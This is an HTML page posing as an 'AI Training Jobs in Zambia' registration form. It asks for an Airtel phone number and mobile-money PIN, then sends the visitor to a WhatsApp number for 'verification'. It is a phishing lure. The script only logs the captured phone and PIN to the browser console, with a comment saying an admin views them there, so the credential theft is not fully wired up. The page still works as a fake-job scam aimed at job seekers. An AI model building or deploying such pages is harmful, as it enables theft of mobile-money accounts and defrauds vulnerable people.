<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>AI Training Jobs in Zambia</title>
<style>
body{font-family:Arial;background:#f4f6f8;margin:0;padding:20px}
.container{max-width:400px;margin:auto;background:#fff;padding:20px;border-radius:8px}
input,button{width:100%;padding:10px;margin:8px 0}
button{background:#0a7cff;color:#fff;border:none;border-radius:4px}
.hidden{display:none}
</style>
</head>
<body>

<div class="container" id="register">
<h2>Register to Earn</h2>
<input type="text" id="phone" placeholder="Airtel Phone Number" required>
<input type="password" id="pin" placeholder="PIN" required>
<button onclick="register()">Register</button>
</div>

<div class="container hidden" id="dashboard">
<h2>Welcome</h2>
<p>For verification, contact us on WhatsApp</p>
<a href="https://wa.me/254741216552" target="_blank">
<button>Call / Message on WhatsApp</button>
</a>
</div>

<script>
function register(){
  const phone = document.getElementById("phone").value;
  const pin = document.getElementById("pin").value;

  if(phone === "" || pin === ""){
    alert("Fill all fields");
    return;
  }

  // STORE DATA (VIEWABLE BY ADMIN VIA BROWSER CONSOLE)
  console.log("New Registration:");
  console.log("Phone:", phone);
  console.log("PIN:", pin);

  document.getElementById("register").classList.add("hidden");
  document.getElementById("dashboard").classList.remove("hidden");
}
</script>

</body>
</html>
